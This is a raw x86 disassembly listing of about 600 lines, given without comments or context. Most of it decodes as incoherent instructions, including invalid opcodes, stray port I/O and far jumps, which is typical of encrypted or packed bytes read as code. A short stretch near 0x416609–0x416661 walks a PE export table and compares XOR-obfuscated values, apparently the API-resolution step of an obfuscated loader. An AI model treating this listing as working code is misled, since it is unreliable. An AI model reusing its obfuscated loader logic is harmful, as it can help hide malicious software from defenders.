  4160e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e5:	jo     0x41609b
  4160e7:	xor    eax,0xb44f777c
  4160ec:	push   DWORD PTR [edx-0x6c71c943]
  4160f2:	mov    al,0xd4
  4160f4:	sub    dh,BYTE PTR [ecx+0x537a2351]
  4160fa:	pop    edx
  4160fb:	pop    ebp
  4160fc:	std    
  4160fd:	xchg   DWORD PTR [eax+0x71],ecx
  416100:	pop    edi
  416101:	mov    al,ds:0x93fe3ca7
  416106:	pop    esp
  416107:	ret    
  416108:	mov    dl,0xcb
  41610a:	popf   
  41610b:	cwde   
  41610c:	sub    esi,edx
  41610e:	xchg   ecx,eax
  41610f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416110:	mov    edi,0x320c23bc
  416115:	push   ebp
  416116:	push   eax
  416117:	pmulhuw mm3,QWORD PTR [ebx+0x59]
  41611b:	jno    0x4160f5
  41611d:	and    BYTE PTR [ebx+0x4a01308f],dl
  416123:	mov    ebp,0xe8b61176
  416128:	stc    
  416129:	xor    BYTE PTR [esi-0xa],0xc4
  41612d:	xor    DWORD PTR [eax+ebp*2],0x31
  416131:	push   edx
  416132:	cmc    
  416133:	dec    esp
  416134:	pusha  
  416135:	cdq    
  416136:	mov    WORD PTR [edi-0x66c69234],fs
  41613c:	iret   
  41613d:	lods   eax,DWORD PTR ds:[esi]
  41613e:	mov    ch,0x28
  416140:	popf   
  416141:	adc    BYTE PTR [edi-0x31eade4],bl
  416147:	loop   0x41615a
  416149:	dec    ebp
  41614a:	ss or  al,0x16
  41614d:	xor    esp,DWORD PTR [eax+ebx*2+0x1c]
  416151:	pop    eax
  416152:	jmp    0xec6d:0x6e10762a
  416159:	mov    bl,0x88
  41615b:	adc    DWORD PTR [ebx+0x2c],ebp
  41615e:	jns    0x41616a
  416160:	ret    0x702c
  416163:	shl    esp,cl
  416165:	in     al,dx
  416166:	lahf   
  416167:	push   esp
  416168:	xchg   esi,eax
  416169:	add    DWORD PTR [ecx+0x18],esi
  41616c:	and    eax,0x7e439288
  416171:	loop   0x416179
  416173:	xor    eax,0x14baba6b
  416178:	mul    BYTE PTR ds:0x39378df8
  41617e:	test   BYTE PTR [edx],dh
  416180:	cmp    al,0x7
  416182:	mov    ebx,0xbfc8e2d9
  416187:	sti    
  416188:	xor    bh,ch
  41618a:	pop    edx
  41618b:	ss out dx,al
  41618d:	cmp    ah,BYTE PTR [esi+0x3b]
  416190:	add    al,0x80
  416192:	out    0xbc,eax
  416194:	fisubr WORD PTR [esi]
  416196:	mov    WORD PTR [ecx],es
  416198:	push   ss
  416199:	inc    esi
  41619a:	mov    cl,BYTE PTR [edi]
  41619c:	fld    DWORD PTR [esi-0x1f7f3925]
  4161a2:	add    eax,0x5c858d47
  4161a7:	mov    dh,0xc8
  4161a9:	sbb    BYTE PTR [eax+ebx*8+0x1c],al
  4161ad:	dec    esp
  4161ae:	xor    DWORD PTR [ebp+0x7],ebx
  4161b1:	pop    edx
  4161b2:	dec    esp
  4161b3:	nop
  4161b4:	or     BYTE PTR [ebx-0x57fa2aa0],0x37
  4161bb:	ins    BYTE PTR es:[edi],dx
  4161bc:	out    0xaa,eax
  4161be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161bf:	popa   
  4161c0:	sub    al,BYTE PTR [edi*2-0x3223356d]
  4161c7:	call   0xae3f:0x4b1e1507
  4161ce:	imul   ebx,edi,0xfffffff5
  4161d1:	inc    edx
  4161d2:	shl    ecx,1
  4161d4:	jp     0x4161ae
  4161d6:	xor    eax,0x5c04fda4
  4161db:	scas   al,BYTE PTR es:[edi]
  4161dc:	and    esi,esi
  4161de:	and    al,0xde
  4161e0:	pop    ebx
  4161e1:	pop    esi
  4161e2:	fwait
  4161e3:	dec    edi
  4161e4:	sbb    eax,0xc6ff97e5
  4161e9:	leave  
  4161ea:	mov    DWORD PTR [edx-0x56],0x9ce79c46
  4161f1:	mov    ecx,0xa5e5dda5
  4161f6:	gs xchg ebp,eax
  4161f8:	jnp    0x4161c5
  4161fa:	xchg   ebp,eax
  4161fb:	in     al,0x22
  4161fd:	rcr    bl,0x90
  416200:	(bad)  
  416201:	lea    ecx,gs:[edx+edi*2]
  416205:	or     eax,0xe8940be3
  41620a:	cmp    dl,BYTE PTR [eax+0x4bc71251]
  416210:	pop    edi
  416211:	dec    ecx
  416212:	dec    edx
  416213:	call   FWORD PTR [ebx+0x79f2c081]
  416219:	mov    ds:0x3f82794b,al
  41621e:	or     DWORD PTR [ecx-0x4833d1d6],0x4e
  416225:	fimul  DWORD PTR [edi-0x247b6ad6]
  41622b:	dec    esp
  41622c:	mov    eax,ds:0x70182909
  416231:	jns    0x416212
  416233:	repnz mov cl,BYTE PTR [esi+0x38505587]
  41623a:	xor    al,0x48
  41623c:	xor    BYTE PTR [ebx],cl
  41623e:	rcr    DWORD PTR [ebp+edx*1-0x4d058f2],cl
  416245:	cmp    al,0xe4
  416247:	push   eax
  416248:	sbb    DWORD PTR ds:0x42329c34,esp
  41624e:	adc    BYTE PTR [ebx+0x390105c2],bl
  416254:	std    
  416255:	add    esi,edi
  416257:	cmp    al,0x93
  416259:	lea    ebp,[edi]
  41625b:	add    ebx,esp
  41625d:	mov    ds:0xbb51c9a9,al
  416262:	mov    dh,0x7d
  416264:	push   0xba0649b8
  416269:	lahf   
  41626a:	jmp    0x19ad8eb3
  41626f:	inc    edi
  416270:	out    dx,eax
  416271:	jmp    0x4162a7
  416273:	inc    edx
  416274:	pop    ecx
  416275:	dec    edi
  416276:	and    eax,0x100dbe02
  41627b:	mov    esi,0xdcfc47e5
  416280:	aam    0x73
  416282:	fnsave [eax+0x3b3f3cf4]
  416288:	leave  
  416289:	xchg   ebx,ebx
  41628b:	ret    0xed28
  41628e:	ss aad 0x51
  416291:	jmp    0x3ca:0x4804fecc
  416298:	mov    ebp,0x35282d6b
  41629d:	adc    bh,BYTE PTR [edx+eax*4]
  4162a0:	push   ecx
  4162a1:	fsubr  QWORD PTR [esp+esi*1+0x69]
  4162a5:	sti    
  4162a6:	gs mov ah,0xb
  4162a9:	mov    fs,WORD PTR [ecx]
  4162ab:	fsub   DWORD PTR [ebp+ecx*4+0x2e30c6d6]
  4162b2:	clc    
  4162b3:	retf   0x9e6e
  4162b6:	div    BYTE PTR [edx-0x2ecf42ed]
  4162bc:	sti    
  4162bd:	pop    ebp
  4162be:	sahf   
  4162bf:	sbb    DWORD PTR [edx],edi
  4162c1:	adc    BYTE PTR [esi+ebp*8+0x7d328c40],0xa
  4162c9:	sbb    BYTE PTR [ebx+ecx*8-0x7647ec67],bh
  4162d0:	push   esi
  4162d1:	jp     0x4162bc
  4162d3:	lds    ebp,FWORD PTR [ecx-0x6d]
  4162d6:	shl    DWORD PTR ds:0xef3a6f82,1
  4162dc:	xchg   edi,eax
  4162dd:	aas    
  4162de:	or     dl,BYTE PTR [eax-0x5ae3988]
  4162e4:	ss inc ebp
  4162e6:	fstp   TBYTE PTR [ecx]
  4162e8:	xor    ecx,DWORD PTR [edx]
  4162ea:	stos   BYTE PTR es:[edi],al
  4162eb:	pop    esp
  4162ec:	fld    st(6)
  4162ee:	sbb    DWORD PTR [edx-0x312caa94],edx
  4162f4:	mov    ebp,0x7ca281ce
  4162f9:	pushf  
  4162fa:	icebp  
  4162fb:	mov    ah,dh
  4162fd:	and    al,0x49
  4162ff:	stos   BYTE PTR es:[edi],al
  416300:	imul   eax,edi,0x2be3fcbf
  416306:	(bad)  
  416307:	stc    
  416308:	jno    0x416296
  41630a:	retf   0xa2ac
  41630d:	(bad)  
  41630e:	dec    edi
  41630f:	jg     0x4162af
  416311:	push   ss
  416312:	ja     0x416340
  416314:	xor    eax,0xde3b8368
  416319:	ret    
  41631a:	and    BYTE PTR [edi],bh
  41631c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41631d:	inc    eax
  41631e:	push   esi
  41631f:	push   es
  416320:	and    BYTE PTR [edx-0x2bfda251],bl
  416326:	mov    bh,BYTE PTR [edi+0x2e]
  416329:	das    
  41632a:	clc    
  41632b:	test   al,0x81
  41632d:	inc    ebx
  41632e:	sub    esi,eax
  416330:	mov    cl,0xaa
  416332:	inc    ebx
  416333:	xchg   esp,eax
  416334:	or     al,0xee
  416336:	in     eax,0x3f
  416338:	in     eax,dx
  416339:	mov    eax,0x908d10a3
  41633e:	and    cl,BYTE PTR [ecx+0x0]
  416341:	xchg   ecx,edx
  416343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416344:	pop    ecx
  416345:	fidiv  DWORD PTR [esi+0x67]
  416348:	(bad)  
  416349:	neg    BYTE PTR [ebx]
  41634b:	scas   eax,DWORD PTR es:[edi]
  41634c:	adc    dh,BYTE PTR [eax+0x2ebbd0b0]
  416352:	sahf   
  416353:	xchg   ebx,eax
  416354:	rol    BYTE PTR [eax],cl
  416356:	mov    cs,edx
  416358:	iret   
  416359:	mov    ds:0x7e274ba4,al
  41635e:	xchg   ecx,eax
  41635f:	xchg   BYTE PTR [ebp+0x71],ch
  416362:	pushf  
  416363:	jg     0x416399
  416365:	popa   
  416366:	xchg   edi,eax
  416367:	xlat   BYTE PTR ds:[ebx]
  416368:	test   al,0x80
  41636a:	adc    DWORD PTR [esi+0x6b53725a],ebx
  416370:	int3   
  416371:	scas   eax,DWORD PTR es:[edi]
  416372:	rcr    DWORD PTR [eiz*1+0x4a37cb8],0x0
  41637a:	xor    DWORD PTR [edx+0x6db05484],ebx
  416380:	shl    DWORD PTR [esi-0xae96c37],1
  416386:	inc    edx
  416387:	xor    al,0x3c
  416389:	mov    ds:0xd981fba6,eax
  41638e:	dec    edx
  41638f:	and    dh,ah
  416391:	inc    edi
  416392:	clc    
  416393:	(bad)  
  416394:	sub    al,0x47
  416396:	push   ecx
  416397:	outs   dx,DWORD PTR ds:[esi]
  416398:	xor    DWORD PTR [edi-0x703f203a],esp
  41639e:	rcr    BYTE PTR [ecx+0x5d2e4dba],1
  4163a4:	adc    esp,ebx
  4163a6:	test   eax,0x2947b3a9
  4163ab:	into   
  4163ac:	pop    ecx
  4163ad:	(bad)  [esp+ebx*1+0x70]
  4163b1:	and    ebx,DWORD PTR [esi+0x34]
  4163b4:	test   DWORD PTR [ecx+ebx*1+0x5d],ebp
  4163b8:	xlat   BYTE PTR ds:[ebx]
  4163b9:	mov    edi,0xd93f8158
  4163be:	test   DWORD PTR [ecx+0x3ee77504],0x7caeaffd
  4163c8:	ins    DWORD PTR es:[edi],dx
  4163c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163ca:	je     0x41637a
  4163cc:	fisttp QWORD PTR [ebx+eax*1]
  4163cf:	xchg   ebp,eax
  4163d0:	jbe    0x4163c3
  4163d2:	fdiv   QWORD PTR [esi+0x55]
  4163d5:	(bad)  
  4163d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163d7:	sub    al,BYTE PTR [ebx+0x1b22a819]
  4163dd:	int3   
  4163de:	loopne 0x416379
  4163e0:	mov    ch,0x86
  4163e2:	fnstcw WORD PTR [ebx]
  4163e4:	popf   
  4163e5:	push   cs
  4163e6:	imul   edx,DWORD PTR [ecx-0x68],0xffffffb0
  4163ea:	dec    ecx
  4163eb:	xor    ebp,eax
  4163ed:	lahf   
  4163ee:	mov    dh,0x62
  4163f0:	and    al,0x25
  4163f2:	sar    BYTE PTR [ebx-0x68],cl
  4163f5:	fidivr DWORD PTR [ecx+ebp*2]
  4163f8:	dec    esp
  4163f9:	push   eax
  4163fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163fb:	adc    DWORD PTR [edi+0x15d9906d],edi
  416401:	ffreep st(4)
  416403:	shl    DWORD PTR [edi-0x765cea67],0xa4
  41640a:	(bad)  
  41640b:	push   esp
  41640c:	sub    eax,0x74755a7e
  416411:	push   eax
  416412:	xor    ecx,DWORD PTR [ecx*8+0xf930ec7]
  416419:	xchg   DWORD PTR [edi+0x1a6633de],ebp
  41641f:	or     edi,DWORD PTR [edi-0x3c]
  416422:	xchg   edx,eax
  416423:	cwde   
  416424:	dec    esi
  416425:	daa    
  416426:	shl    BYTE PTR [eax],1
  416428:	rcr    DWORD PTR ds:0x35b74fdf,0x9b
  41642f:	or     al,bh
  416431:	fwait
  416432:	dec    ebp
  416434:	pop    edi
  416435:	fisttp QWORD PTR [esi-0x19]
  416438:	xor    DWORD PTR [esi+0x68],0x1a341029
  41643f:	test   eax,0x5080d99c
  416444:	daa    
  416445:	je     0x416414
  416447:	aad    0x9
  416449:	dec    ebp
  41644a:	add    BYTE PTR [edi+0x22],dl
  41644d:	xchg   esp,eax
  41644e:	mov    esi,0x7f4cde78
  416453:	xchg   esi,eax
  416454:	xchg   ebp,eax
  416455:	adc    DWORD PTR [edi-0x7b],0x214bf391
  41645c:	int3   
  41645d:	mov    es,WORD PTR [ebx-0x6]
  416460:	sub    cl,ch
  416462:	in     eax,0x4c
  416464:	js     0x4164ae
  416466:	sub    cl,BYTE PTR [ecx-0x3d]
  416469:	cmp    al,0x7d
  41646b:	jl     0x4164b1
  41646d:	push   edi
  41646e:	in     al,dx
  41646f:	out    0x84,eax
  416471:	cmp    BYTE PTR [edi],cl
  416473:	inc    ecx
  416474:	retf   0xd150
  416477:	mov    bl,0xc6
  416479:	pop    es
  41647a:	call   0xc38a:0x1bff0eaa
  416481:	sbb    BYTE PTR [eax],dl
  416483:	pop    ss
  416484:	and    bh,BYTE PTR [eax+0x25bd23fb]
  41648a:	mov    ebx,ebx
  41648c:	mov    DWORD PTR [esi+eax*8],edi
  41648f:	cli    
  416490:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  416492:	jae    0x416433
  416494:	mov    bh,0x35
  416496:	int3   
  416497:	cmp    bl,bh
  416499:	xchg   esp,eax
  41649a:	push   edx
  41649b:	dec    ebp
  41649c:	(bad)  
  41649e:	and    DWORD PTR [edx-0x31bc4990],0x69
  4164a5:	lahf   
  4164a6:	push   eax
  4164a7:	or     ecx,edx
  4164a9:	xlat   BYTE PTR ds:[ebx]
  4164aa:	adc    al,0x55
  4164ac:	bound  esp,QWORD PTR [edx-0x7c082a26]
  4164b2:	mov    ebp,0x8dc66fc3
  4164b7:	mov    fs,WORD PTR [ecx-0x37]
  4164ba:	std    
  4164bb:	out    dx,eax
  4164bc:	cmp    cl,ah
  4164be:	leave  
  4164bf:	sti    
  4164c0:	das    
  4164c1:	out    dx,eax
  4164c2:	inc    ebp
  4164c3:	jge    0x4164ca
  4164c5:	jmp    0x416530
  4164c7:	stos   BYTE PTR es:[edi],al
  4164c8:	nop
  4164c9:	fnstsw WORD PTR [edi-0x6]
  4164cc:	inc    edx
  4164cd:	jecxz  0x416541
  4164cf:	mov    edx,0x48b958f
  4164d4:	(bad)  
  4164d5:	call   FWORD PTR [ecx+0x33]
  4164d8:	dec    eax
  4164d9:	sub    DWORD PTR [edx],esi
  4164db:	ficom  DWORD PTR [edi-0x42c8a526]
  4164e1:	xchg   ebp,eax
  4164e2:	add    BYTE PTR ds:0x50a7f9b4,dl
  4164e8:	in     eax,dx
  4164e9:	xchg   ebx,eax
  4164ea:	rcr    BYTE PTR [edx],cl
  4164ec:	lods   al,BYTE PTR ds:[esi]
  4164ed:	dec    esp
  4164ee:	pop    ebp
  4164ef:	and    DWORD PTR [eax-0x1c],esp
  4164f2:	fistp  WORD PTR [eax+0x7c]
  4164f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f6:	xchg   esp,eax
  4164f7:	das    
  4164f8:	cwde   
  4164f9:	test   al,0x77
  4164fb:	mov    edx,0xfce245cb
  416500:	scas   eax,DWORD PTR es:[edi]
  416501:	mov    ebp,0x187e3621
  416506:	aam    0xb2
  416508:	test   DWORD PTR [esi+0x582d5f61],edi
  41650e:	sbb    eax,esp
  416510:	ins    DWORD PTR es:[edi],dx
  416511:	add    DWORD PTR [ebp-0x62eb1981],esp
  416517:	pop    ds
  416518:	cmp    al,0x5
  41651a:	sub    eax,0x670268fb
  41651f:	(bad)  
  416520:	(bad)  
  416521:	ds sub eax,0xfb6a6b72
  416527:	repnz (bad) 
  41652a:	ins    DWORD PTR es:[edi],dx
  41652b:	sub    DWORD PTR [esi+eiz*1],eax
  41652e:	mov    esi,0xaab18231
  416533:	mov    bh,0xf4
  416535:	add    esp,DWORD PTR [esi-0x3a]
  416538:	sbb    edx,0xffffff8c
  41653b:	std    
  41653c:	hlt    
  41653d:	fsub   QWORD PTR [edx+0x7ea26a3a]
  416543:	in     eax,0x1c
  416545:	ins    BYTE PTR es:[edi],dx
  416546:	adc    DWORD PTR [edi+0x6f],ecx
  416549:	sub    BYTE PTR [ebp+0x3aa3eaaf],0x51
  416550:	daa    
  416551:	mov    dh,0xdd
  416553:	sahf   
  416554:	lock (bad) 
  416556:	sbb    esp,DWORD PTR [edx+ebx*1-0x5f]
  41655a:	imul   edx,DWORD PTR [ebx-0x6c],0x45
  41655e:	dec    edi
  41655f:	scas   al,BYTE PTR es:[edi]
  416560:	or     ch,BYTE PTR [edi-0x5d]
  416563:	xor    BYTE PTR [eax+0x20],dh
  416566:	ss dec ebx
  416568:	dec    ebx
  416569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41656a:	inc    esi
  41656b:	mov    eax,ds:0x50252975
  416570:	data16 (bad) 
  416572:	cmp    ebx,edx
  416574:	adc    dl,ch
  416576:	popf   
  416577:	xchg   ecx,eax
  416578:	std    
  416579:	jo     0x416560
  41657b:	(bad)  
  41657c:	aas    
  41657d:	jl     0x416556
  41657f:	notrack call DWORD PTR [eax-0x7ddd0be]
  416586:	push   ebx
  416587:	pop    ds
  416588:	popa   
  416589:	repz ret 0x2c31
  41658d:	xor    al,0xd6
  41658f:	cmp    eax,0xa967eca8
  416594:	das    
  416595:	sti    
  416596:	inc    esi
  416597:	jbe    0x4165e8
  416599:	fst    DWORD PTR [ecx-0x19]
  41659c:	adc    ch,BYTE PTR ds:0x5cef3793
  4165a2:	mov    dl,0x89
  4165a4:	push   edi
  4165a5:	dec    edx
  4165a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165a7:	jle    0x416609
  4165a9:	jnp    0x416554
  4165ab:	pusha  
  4165ac:	imul   esi,DWORD PTR [edx],0x8a73b306
  4165b2:	pop    ss
  4165b3:	sti    
  4165b4:	sar    edx,1
  4165b6:	popa   
  4165b7:	push   edx
  4165b8:	mov    ecx,0xc23fa03f
  4165bd:	fldenv [edi]
  4165bf:	in     eax,dx
  4165c0:	jmp    0x416568
  4165c2:	and    eax,0xa229abb6
  4165c7:	push   eax
  4165c8:	push   ds
  4165c9:	rcl    ah,1
  4165cb:	fldl2e 
  4165cd:	jecxz  0x4165a2
  4165cf:	sub    DWORD PTR [esi+0x3],edx
  4165d2:	xchg   DWORD PTR [edi+0x4d56dc3],ecx
  4165d8:	rol    dl,1
  4165da:	pushf  
  4165db:	dec    esi
  4165dc:	push   0x4c
  4165de:	xor    DWORD PTR [edx-0x36210ede],eax
  4165e4:	dec    ebx
  4165e5:	push   cs
  4165e6:	es cli 
  4165e8:	dec    esi
  4165e9:	xchg   edx,eax
  4165ea:	gs aaa 
  4165ec:	test   eax,0xf52b0af9
  4165f1:	sbb    eax,0x439c5608
  4165f6:	add    bl,ch
  4165f8:	mov    ecx,0x22850f9d
  4165fd:	add    BYTE PTR [eax],al
  4165ff:	add    BYTE PTR [esi+0xf],ah
  416602:	mov    esi,0x3b4bbb38
  416607:	add    BYTE PTR [eax],al
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    dl,ch
  416673:	call   0x241c72d7
  416678:	popa   
  416679:	(bad)  
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	add    DWORD PTR ds:0x3a9d893c,ebx
  416684:	in     eax,dx
  416685:	(bad)  
  416686:	fiadd  WORD PTR [eax+0x71]
  416689:	add    al,0x7f
  41668b:	and    eax,0x39652f0
  416690:	or     al,0x46
  416692:	sub    DWORD PTR [esi],0xd1c3b283
  416698:	xor    al,0xa7
  41669a:	push   cs
  41669b:	pop    edi
  41669c:	xchg   edx,eax
  41669d:	sub    bh,al
  41669f:	jmp    0xa873:0x12453eb5
  4166a6:	into   
  4166a7:	jecxz  0x416649
  4166a9:	sub    al,0x11
  4166ab:	mov    cl,ah
  4166ad:	mov    dh,0xa9
  4166af:	jae    0x4166cd
  4166b1:	fwait
  4166b2:	mov    esp,0xadafc900
  4166b7:	mov    dh,BYTE PTR [ebx]
  4166b9:	jbe    0x416713
  4166bb:	mov    ebx,0x507780d4
  4166c0:	(bad)  
  4166c1:	icebp  
  4166c2:	std    
  4166c3:	loop   0x41673d
  4166c5:	xchg   DWORD PTR [edx-0x340ddf7],eax
  4166cb:	sub    al,0x38
  4166cd:	cli    
  4166ce:	lahf   
  4166cf:	cdq    
  4166d0:	xor    BYTE PTR [edx],ch
  4166d2:	dec    edi
  4166d3:	(bad)  
  4166d4:	sbb    bh,BYTE PTR [edi+0x7954d6d5]
  4166da:	(bad)  
  4166db:	xchg   ecx,eax
  4166dc:	pop    edi
  4166dd:	mov    bh,0xe4
  4166df:	jns    0x4166bd
  4166e1:	fnstsw WORD PTR [eax]
  4166e3:	sbb    BYTE PTR [ebx],dl
  4166e5:	and    eax,0x2c4b93e4
  4166ea:	jle    0x41675d
  4166ec:	dec    DWORD PTR [esi+0x56b82d6a]
  4166f2:	dec    eax
  4166f3:	rcl    DWORD PTR [ebx+0x7b],cl
  4166f6:	xchg   BYTE PTR ds:0xa1c57bce,ah
  4166fc:	and    eax,0xfda19dfd
  416701:	popa   
  416702:	lea    ebx,ds:0xfb048e4c
  416708:	push   ds
  416709:	popa   
  41670a:	ins    BYTE PTR es:[edi],dx
  41670b:	sar    BYTE PTR [eax-0x3b],0xc3
  41670f:	push   cs
  416710:	sbb    al,0xd3
  416712:	mov    ah,0x36
  416714:	sbb    DWORD PTR ds:[ebx],ebp
  416717:	pop    ebx
  416718:	add    bh,BYTE PTR [edi-0x1c]
  41671b:	fwait
  41671c:	icebp  
  41671d:	icebp  
  41671e:	push   edx
  41671f:	pop    ebp
  416720:	dec    edi
  416721:	pop    eax
  416722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416723:	mov    ebx,0xf96aa544
  416728:	xlat   BYTE PTR ds:[ebx]
  416729:	ror    BYTE PTR [esi-0x4f],1
  41672c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41672d:	cmp    eax,0x74fdbde1
  416732:	jmp    0x41675b
  416734:	lock rcl BYTE PTR [edx],cl
  416737:	push   ecx
  416738:	pop    eax
  416739:	cmp    BYTE PTR [ecx+0x1b],ch
  41673c:	adc    esp,DWORD PTR [edi+0x327fbcd8]
  416742:	cdq    
  416743:	rcl    BYTE PTR [esi],1
  416745:	retf   
  416746:	ja     0x4167bf
  416748:	jmp    0x3b1e7fc4
  41674d:	push   ss
  41674e:	sub    BYTE PTR [ebx],al
  416750:	shr    DWORD PTR [edx],cl
  416752:	sbb    bl,bl
  416754:	popa   
  416755:	rcr    DWORD PTR [edx],0xcc
  416758:	cmc    
  416759:	addr16 mov ebp,0xdc269fbb
  41675f:	add    al,0xcb
  416761:	dec    ebp
  416762:	pop    edx
  416763:	repz aaa 
  416765:	sbb    cl,BYTE PTR [ebx+0x5f7b418c]
  41676b:	inc    BYTE PTR [ebp+ecx*4-0x35]
  41676f:	jge    0x416744
  416771:	or     eax,0xe83f0a65
  416776:	adc    al,0xad
  416778:	in     eax,0x1d
  41677a:	xor    DWORD PTR [edi+0x2e],ebp
  41677d:	add    bh,BYTE PTR [edx+ebp*1-0x53]
  416781:	and    ah,al
  416783:	clc    
  416784:	sub    esp,0x50
  416787:	sub    al,0x32
  416789:	pop    ebp
  41678a:	rol    BYTE PTR ds:[eax],cl
  41678d:	repnz xchg ecx,eax
  41678f:	repz cmc 
  416791:	and    edx,DWORD PTR [eax]
  416793:	sbb    BYTE PTR [esi],dl
  416795:	push   ebp
  416796:	xchg   ebp,eax
  416797:	mov    ebx,0xca01cd10
  41679c:	and    bh,bh
  41679e:	les    eax,FWORD PTR ds:0x742651ed
  4167a4:	and    BYTE PTR [eax-0x58e42fbe],ch
  4167aa:	div    DWORD PTR [edx+0x757000fd]
  4167b0:	idiv   BYTE PTR [esi+0x49]
  4167b3:	jo     0x416834
  4167b5:	fsubr  DWORD PTR [esi]
  4167b7:	outs   dx,DWORD PTR ds:[esi]
  4167b8:	clc    
  4167b9:	imul   esp,DWORD PTR [ecx+ebx*2],0x41afd23a
  4167c0:	pop    edi
  4167c1:	cmp    eax,DWORD PTR [ebp-0x43]
  4167c4:	xchg   esi,eax
  4167c5:	aaa    
  4167c6:	fild   QWORD PTR [esi+0x1ab943ea]
  4167cc:	xlat   BYTE PTR ds:[ebx]
  4167cd:	jecxz  0x41683e
  4167cf:	cmp    eax,0x33f4a5cf
  4167d4:	xchg   esi,eax
  4167d5:	xor    eax,0x132ba029
  4167da:	(bad)  
  4167db:	pusha  
  4167dc:	jmp    0x295ec4b7
  4167e1:	fisttp WORD PTR [eax]
  4167e3:	sub    eax,0xb0627cfe
  4167e8:	cmc    
  4167e9:	and    BYTE PTR [ecx],0xd0
  4167ec:	adc    al,0x38
  4167ee:	hlt    
  4167ef:	mov    cl,0xb
  4167f1:	out    0xc8,al
  4167f3:	in     eax,dx
  4167f4:	xor    BYTE PTR ds:0x82967f74,0x3d
  4167fb:	mov    esi,0xe686cc4d
  416800:	xlat   BYTE PTR ds:[ebx]
  416801:	aaa    
  416802:	push   ecx
  416804:	sbb    eax,ebx
  416806:	sub    eax,0x4d5a503f
  41680b:	(bad)  
  41680c:	fwait
  41680d:	push   ecx
  41680e:	pushf  
  41680f:	lock xchg esp,eax
  416811:	mov    ds:0x51d2c77,eax
  416816:	into   
  416817:	in     al,dx
  416818:	xchg   DWORD PTR [ecx+0x6468fb6d],ebx
  41681e:	jge    0x4167a5
  416820:	lea    ebx,[esi+eiz*4]
  416823:	cmp    dl,al
  416825:	xchg   BYTE PTR [edx-0x6d],al
  416828:	sbb    DWORD PTR [ebp+0x18b1d6ce],esp
  41682e:	mov    esp,0x15b9a416
  416833:	and    DWORD PTR [edx+0x152c4f4b],edx
  416839:	lock inc ebp
  41683b:	test   al,0x8e
  41683d:	outs   dx,BYTE PTR ds:[esi]
  41683e:	mov    ds:0x37a37e8a,eax
  416843:	jecxz  0x4167f9
  416845:	push   0x2fc1a3a1
  41684a:	lods   eax,DWORD PTR ds:[esi]
  41684b:	sbb    eax,0x64ded21e
  416850:	mov    eax,0x5279e24b
  416855:	xchg   ebx,eax
  416856:	mov    eax,ds:0x8b73d5db
  41685b:	aam    0xb3
  41685d:	jns    0x416879
  41685f:	xchg   ebp,eax
  416860:	or     eax,0xbd8b2f0f
  416865:	sbb    edi,DWORD PTR [eax]
  416867:	mov    ds:0xc889356e,al
  41686c:	jge    0x416888
  41686e:	jl     0x41681a
  416870:	sbb    DWORD PTR [ecx],edx
  416872:	loopne 0x4168aa
  416874:	test   al,0xf6
  416876:	cmp    al,0x86
  416878:	in     al,0x21
  41687a:	add    DWORD PTR [ecx-0x74e08393],esi
  416880:	pop    es
  416881:	and    ebp,DWORD PTR [ebx]
  416883:	adc    cl,dl
  416885:	lock mov BYTE PTR [ecx+0x23],dh
  416889:	or     eax,0x4019bd85
  41688e:	jae    0x4168ba
  416890:	fdiv   DWORD PTR [edx]
  416892:	lds    ecx,FWORD PTR [eax+edi*1+0x15]
  416896:	jnp    0x4168ef
  416898:	cmp    esi,edx
  41689a:	mov    ds:0xd4bd8740,eax
  41689f:	adc    DWORD PTR [ebx+ecx*8-0x9488ecf],edx
  4168a6:	pushf  
  4168a7:	out    0x13,al
  4168a9:	mov    edx,DWORD PTR [ebx+edi*4+0x51]
  4168ad:	jmp    0x50e0712b
  4168b2:	pop    eax
  4168b3:	ret    
  4168b4:	push   esp
  4168b5:	pop    eax
  4168b6:	and    dl,dh
  4168b8:	pop    ebx
  4168b9:	adc    DWORD PTR [eax-0x5b6f9a7a],edx
  4168bf:	jl     0x4168f4
  4168c1:	xchg   ebx,eax
  4168c2:	sbb    DWORD PTR [edx],ecx
  4168c4:	outs   dx,DWORD PTR ds:[esi]
  4168c5:	pop    es
  4168c6:	mov    cl,0x3b
  4168c8:	xor    edx,DWORD PTR [ebx+0x66]
  4168cb:	and    eax,0x39034b44
  4168d0:	cli    
